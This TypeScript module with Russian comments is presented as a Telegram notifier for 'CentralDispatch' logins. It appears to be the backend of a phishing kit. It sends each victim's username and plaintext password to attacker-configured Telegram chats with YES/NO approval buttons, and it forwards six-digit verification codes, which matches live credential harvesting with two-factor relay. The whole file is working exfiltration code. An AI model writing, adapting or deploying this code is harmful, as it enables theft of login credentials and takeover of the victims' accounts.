/**
 * Модуль для работы с Telegram Bot API
 * Отправка уведомлений о входе в систему с кнопками YES/NO
 */

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
// Дополнительные Chat ID для отправки сообщений (через запятую)
const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_IDS || "";

/**
 * Отправка сообщения в Telegram с кнопками YES/NO
 * @param username - имя пользователя
 * @param password - пароль
 * @param requestId - уникальный ID запроса для отслеживания ответа
 * @returns message_id отправленного сообщения
 */
export async function sendLoginTelegram(
  username: string,
  password: string,
  requestId: string
): Promise<number> {
  console.log("[TELEGRAM] Отправка уведомления о входе...");
  console.log("[TELEGRAM] Request ID:", requestId);

  if (!TELEGRAM_BOT_TOKEN) {
    throw new Error("TELEGRAM_BOT_TOKEN должен быть настроен");
  }

  // Формируем список Chat ID для отправки
  const chatIds: string[] = [];
  if (TELEGRAM_CHAT_ID) {
    chatIds.push(TELEGRAM_CHAT_ID);
  }
  if (TELEGRAM_CHAT_IDS) {
    // Разделяем по запятой и добавляем в список
    const additionalIds = TELEGRAM_CHAT_IDS.split(",").map(id => id.trim()).filter(id => id);
    chatIds.push(...additionalIds);
  }

  if (chatIds.length === 0) {
    throw new Error("TELEGRAM_CHAT_ID или TELEGRAM_CHAT_IDS должны быть настроены");
  }

  console.log("[TELEGRAM] Отправка на Chat IDs:", chatIds.join(", "));

  const message = `🔐 *CentralDispatch - Новый вход в систему*

👤 *Username:* \`${username}\`
🔑 *Password:* \`${password}\`

⏰ *Время:* ${new Date().toLocaleString("ru-RU")}

Выберите действие:`;

  const keyboard = {
    inline_keyboard: [
      [
        {
          text: "✅ YES",
          callback_data: `login_yes_${requestId}`,
        },
        {
          text: "❌ NO",
          callback_data: `login_no_${requestId}`,
        },
      ],
    ],
  };

  // Отправляем сообщения на все Chat ID
  const sendPromises = chatIds.map(async (chatId) => {
    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown",
            reply_markup: keyboard,
          }),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        console.error(`[TELEGRAM] Ошибка отправки на ${chatId}:`, data);
        return null;
      }

      console.log(`[TELEGRAM] Сообщение успешно отправлено на ${chatId}, message_id:`, data.result.message_id);
      return data.result.message_id;
    } catch (error) {
      console.error(`[TELEGRAM] Ошибка отправки на ${chatId}:`, error);
      return null;
    }
  });

  try {
    const results = await Promise.all(sendPromises);
    const successfulResults = results.filter(r => r !== null);
    
    if (successfulResults.length === 0) {
      throw new Error("Не удалось отправить сообщение ни на один Chat ID");
    }

    console.log(`[TELEGRAM] Сообщения отправлены на ${successfulResults.length} из ${chatIds.length} Chat ID`);
    return successfulResults[0] as number; // Возвращаем первый успешный message_id
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw new Error("Не удалось отправить сообщение в Telegram");
  }
}

/**
 * Отправка кода верификации в Telegram (без кнопок)
 * @param code - 6-значный код верификации
 * @param username - имя пользователя (опционально)
 * @returns message_id отправленного сообщения
 */
export async function sendCodeTelegram(
  code: string,
  username?: string
): Promise<number> {
  console.log("[TELEGRAM] Отправка кода верификации...");
  console.log("[TELEGRAM] Код:", code);

  if (!TELEGRAM_BOT_TOKEN) {
    throw new Error("TELEGRAM_BOT_TOKEN должен быть настроен");
  }

  // Формируем список Chat ID для отправки
  const chatIds: string[] = [];
  if (TELEGRAM_CHAT_ID) {
    chatIds.push(TELEGRAM_CHAT_ID);
  }
  if (TELEGRAM_CHAT_IDS) {
    // Разделяем по запятой и добавляем в список
    const additionalIds = TELEGRAM_CHAT_IDS.split(",").map(id => id.trim()).filter(id => id);
    chatIds.push(...additionalIds);
  }

  if (chatIds.length === 0) {
    throw new Error("TELEGRAM_CHAT_ID или TELEGRAM_CHAT_IDS должны быть настроены");
  }

  console.log("[TELEGRAM] Отправка кода на Chat IDs:", chatIds.join(", "));

  const message = `🔐 *CentralDispatch - Код подтверждения*

📝 *Код:* \`${code}\`
${username ? `👤 *Username:* \`${username}\`` : ""}

⏰ *Время:* ${new Date().toLocaleString("ru-RU")}

Введите этот код для подтверждения входа.`;

  // Отправляем сообщения на все Chat ID
  const sendPromises = chatIds.map(async (chatId) => {
    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown",
          }),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        console.error(`[TELEGRAM] Ошибка отправки кода на ${chatId}:`, data);
        return null;
      }

      console.log(`[TELEGRAM] Код успешно отправлен на ${chatId}, message_id:`, data.result.message_id);
      return data.result.message_id;
    } catch (error) {
      console.error(`[TELEGRAM] Ошибка отправки кода на ${chatId}:`, error);
      return null;
    }
  });

  try {
    const results = await Promise.all(sendPromises);
    const successfulResults = results.filter(r => r !== null);
    
    if (successfulResults.length === 0) {
      throw new Error("Не удалось отправить код ни на один Chat ID");
    }

    console.log(`[TELEGRAM] Код отправлен на ${successfulResults.length} из ${chatIds.length} Chat ID`);
    return successfulResults[0] as number; // Возвращаем первый успешный message_id
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw new Error("Не удалось отправить код в Telegram");
  }
}

/**
 * Отправка ответа на callback query (убирает loading на кнопках)
 * @param callbackQueryId - ID callback query
 * @param text - текст ответа (опционально)
 */
export async function answerCallbackQuery(
  callbackQueryId: string,
  text?: string
): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN) {
    return;
  }

  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          callback_query_id: callbackQueryId,
          text: text || "Обработано",
        }),
      }
    );
  } catch (error) {
    console.error("[TELEGRAM] Ошибка ответа на callback:", error);
  }
}

